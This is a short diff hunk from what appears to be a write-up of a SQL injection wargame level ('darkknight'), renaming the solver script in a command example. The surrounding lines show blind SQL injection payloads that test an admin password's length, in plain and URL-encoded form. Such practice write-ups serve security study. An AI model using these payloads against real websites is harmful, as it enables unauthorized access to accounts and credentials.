@@ -170,7 +170,7 @@ print(f'[!] Final payload: ?pw={password}')
 ```
 
 ```
-python .\losqli.py
+python .\darkknight_script.py
 
 [!] Payload: ?no=0 OR id LIKE "admin" AND length(pw) LIKE 8
 [!] Payload (URL encoded): ?no=0+OR+id+LIKE+%22admin%22+AND+length%28pw%29+LIKE+8
